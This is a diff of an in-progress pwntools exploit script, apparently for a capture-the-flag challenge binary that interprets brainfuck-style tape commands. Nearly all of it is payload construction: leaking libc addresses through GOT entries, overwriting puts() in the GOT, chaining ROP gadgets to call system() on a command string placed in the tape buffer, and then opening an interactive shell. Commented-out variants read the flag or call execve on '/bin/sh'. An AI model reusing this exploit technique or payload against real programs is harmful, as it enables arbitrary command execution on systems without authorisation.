@@ -39,7 +39,6 @@ system_addr = libc.symbols["system"]
 execve_addr = libc.symbols["execve"]
 print(f"system_addr: {str(system_addr)}")
 print(f"execve: {p32(execve_addr)}")
-padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"  
 # fill stack with arbitrary values so I can increase esp and prepare stack for
 sh_addr = system_addr + 0x120d7b
 
@@ -54,15 +53,23 @@ jmp_back_to_code_start = 0x8048470
 print(f"sh_addr: {str(sh_addr)}")
 good_jump_addr = 0x0804857d
 #payload = padding + p32(0xdeadbeef) +  p32(good_jump_addr)
+
+# TODO TODAY WEDNESDAY - Add here the commoand and use ,>,>,> with and
+# conn.send() <<<
 payload = b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b".>.>.>." # leak the address of puts
 payload += b"<<<" # leak the address of puts
 payload += b">" * 24 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b",>,>,>," # getchar - for getting the last char
+payload += b">" * 109 # move to tape addr
+payload += b"[" # write command ls -l into tape 
+payload += b",>,>,>," # write command ls -l into tape 
+payload += b"<" * 112 # write command ls -l into tape 
 payload += b"." # trigger char
-payload += b"cat flag" # payload - address is 0xffffcc6e but maybe changes
+#payload += b"cat flag" # payload - address is 0xffffcc6e but maybe changes
 payload += b"\n" # call to puts()
 conn.send(payload)
+print(payload)
 
 the_output = conn.recvn(4)
 print(f"OUTPUT: {the_output}")
@@ -96,7 +103,6 @@ target = libc_addr + 0x001134d9 # add to esp
 #payload = my_rop
 # I'm going to bulid a ROP chain here in the heap!
 heap_arbitrary_addr = 0x804b0a7
-#payload +=b"BBBB"
 heap_rop_nop = libc_addr + 0x0000c30c
 print(f"heap nop rop : {hex(heap_rop_nop)}")
 #payload =my_rop
@@ -105,18 +111,24 @@ memset_addr_in_main = 0x8048700
 pop_ebx = libc_addr + 0x000183a5
 # 2nd program iteration - 1st half
 null_addr = 0x804b20c
+tape_addr = 0x0804a0a0 # tape is our heap var with command string
 payload = p32(memset_addr_in_main)
-payload +=b"aaaabaaacaaa"
-payload += p32(pop_ebx)
-payload += p32(sh_addr)
-payload += p32(execve_addr)
+#payload += b"ls -l"
+#payload += p32(system_addr)
+#payload += p32(tape_addr)
+#payload += p32(pop_ebx)
 payload += p32(0x11111111)
-payload += p32(sh_addr)
-payload += p32(null_addr)
-payload += p32(null_addr)
-payload += p32(0x55555555)
+payload += p32(0x11111111)
+payload += p32(0x11111111)
+payload += p32(0x11111111)
+payload += p32(system_addr)
+payload += p32(tape_addr)
+#main_ret_addr = 0x804878E
+#payload += p32(main_ret_addr) # program will jump here
+#payload += p32(null_addr)
+#payload += p32(null_addr)
+#payload += p32(0x55555555)
 # fallback is putting it in heap in fgets input
-#payload +=b" flagaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"# decrease from putchar() GOT to puts() GOT address
 payload += b"<"  * 27# decrease from putchar() GOT to puts() GOT address
 payload += b",>,>,>," # Setting the puts() GOT address
 payload += b"[" # Calling the puts() 
@@ -128,8 +140,10 @@ with open("payload", "ab+") as f:
 
 # 2nd program iteration - 2nd half
 add_esp = libc_addr + 0x0005b980 # pop ecx pop edx-1st pop to get rid of [ str
+add_esp = libc_addr + 0x000bd5da # stack has changed
+print(f"add esp addr: {hex(add_esp)}")
 payload = p32(add_esp) # the ADD ESP ROP address
-payload += b"AAAABBBB" # jump to memset() line
+payload += b"BBBB" # jump to memset() line
 #payload += p32(0x8048700) # jump to memset() line
 #payload += p32(0x22334455) # jump to memset() line
 payload += b"\n" # call to puts()
@@ -139,4 +153,5 @@ conn.sendline(payload)
 with open("payload", "ab+") as f:
     f.write(payload)
 
+conn.interactive()
 print(payload)
